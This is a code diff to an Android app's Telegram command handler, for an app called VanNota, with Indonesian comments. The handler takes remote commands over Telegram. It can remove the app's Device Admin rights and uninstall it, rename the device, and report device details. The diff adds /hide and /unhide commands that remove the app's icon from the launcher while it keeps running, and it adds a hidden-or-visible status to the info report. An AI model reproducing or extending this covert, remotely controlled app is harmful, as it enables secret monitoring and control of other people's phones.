@@ -5,6 +5,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
@@ -87,10 +88,8 @@ public class TelegramSender {
         if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
             Log.d(TAG, "🗑️ Perintah uninstall diterima!");
             
-            // Kirim konfirmasi
             sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + Build.MODEL + "...");
             
-            // Matikan Device Admin agar bisa diuninstall
             try {
                 DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                 ComponentName admin = new ComponentName(context, AdminReceiver.class);
@@ -102,12 +101,10 @@ public class TelegramSender {
                 Log.e(TAG, "❌ Gagal matikan admin: " + e.getMessage());
             }
             
-            // Tunggu sebentar agar admin mati
             try {
                 Thread.sleep(1500);
             } catch (InterruptedException ignored) {}
             
-            // Jalankan proses uninstall
             try {
                 Intent intent = new Intent(Intent.ACTION_DELETE);
                 intent.setData(Uri.parse("package:" + context.getPackageName()));
@@ -119,8 +116,62 @@ public class TelegramSender {
                 sendMessage(context, "❌ GAGAL UNINSTALL", "Error: " + e.getMessage());
             }
             
-            // Hentikan proses aplikasi
             android.os.Process.killProcess(android.os.Process.myPid());
+            return;
+        }
+        
+        // ==========================================
+        // PERINTAH: /hide - SEMBUNYIKAN APLIKASI DARI LAUNCHER
+        // ==========================================
+        if (command.equalsIgnoreCase("/hide")) {
+            Log.d(TAG, "👻 Perintah hide diterima!");
+            
+            try {
+                // Nonaktifkan komponen launcher
+                PackageManager pm = context.getPackageManager();
+                ComponentName componentName = new ComponentName(context, MainActivity.class);
+                
+                // Set status menjadi disabled (sembunyi dari launcher)
+                pm.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                );
+                
+                sendMessage(context, "👻 HIDE", "Aplikasi VanNota disembunyikan dari launcher.\nKirim /unhide untuk menampilkan kembali.");
+                Log.d(TAG, "✅ Aplikasi disembunyikan");
+                
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Gagal hide: " + e.getMessage());
+                sendMessage(context, "❌ GAGAL HIDE", "Error: " + e.getMessage());
+            }
+            return;
+        }
+        
+        // ==========================================
+        // PERINTAH: /unhide - TAMPILKAN APLIKASI KEMBALI
+        // ==========================================
+        if (command.equalsIgnoreCase("/unhide")) {
+            Log.d(TAG, "👀 Perintah unhide diterima!");
+            
+            try {
+                PackageManager pm = context.getPackageManager();
+                ComponentName componentName = new ComponentName(context, MainActivity.class);
+                
+                // Set status menjadi enabled (muncul di launcher)
+                pm.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP
+                );
+                
+                sendMessage(context, "👀 UNHIDE", "Aplikasi VanNota muncul kembali di launcher.");
+                Log.d(TAG, "✅ Aplikasi dimunculkan kembali");
+                
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Gagal unhide: " + e.getMessage());
+                sendMessage(context, "❌ GAGAL UNHIDE", "Error: " + e.getMessage());
+            }
             return;
         }
         
@@ -133,15 +184,24 @@ public class TelegramSender {
             String deviceId = prefs.getString("device_id", "Tidak diketahui");
             String androidVersion = Build.VERSION.RELEASE;
             
+            // Cek status launcher (apakah aplikasi terlihat)
+            PackageManager pm = context.getPackageManager();
+            ComponentName componentName = new ComponentName(context, MainActivity.class);
+            int setting = pm.getComponentEnabledSetting(componentName);
+            String visibility = (setting == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) ? "Tersembunyi" : "Terlihat";
+            
             String info = "📱 INFO PERANGKAT\n" +
                           "Nama: " + deviceName + "\n" +
                           "Android: " + androidVersion + "\n" +
                           "ID: " + deviceId + "\n" +
-                          "Status: Aktif\n\n" +
+                          "Status Launcher: " + visibility + "\n\n" +
                           "Perintah:\n" +
+                          "/hide - Sembunyikan aplikasi\n" +
+                          "/unhide - Tampilkan aplikasi\n" +
                           "/uninstall - Hapus aplikasi\n" +
                           "/rename [nama] - Ubah nama perangkat\n" +
-                          "/info - Lihat info ini";
+                          "/info - Lihat info ini\n" +
+                          "/help - Bantuan";
             
             sendMessage(context, "ℹ️ Device Info", info);
             return;
@@ -169,8 +229,10 @@ public class TelegramSender {
         // ==========================================
         if (command.equalsIgnoreCase("/help")) {
             String help = "📋 DAFTAR PERINTAH\n\n" +
+                          "/hide - Sembunyikan aplikasi dari launcher\n" +
+                          "/unhide - Tampilkan aplikasi di launcher\n" +
                           "/uninstall - Hapus aplikasi dari perangkat ini\n" +
-                          "/info - Lihat info perangkat\n" +
+                          "/info - Lihat info perangkat + status launcher\n" +
                           "/rename [nama] - Ubah nama perangkat\n" +
                           "/help - Tampilkan bantuan ini\n\n" +
                           "⚠️ Hanya pemilik yang dapat menggunakan perintah ini.";
@@ -183,4 +245,4 @@ public class TelegramSender {
         // ==========================================
         sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /help untuk melihat daftar perintah.");
     }
-                    }
+}
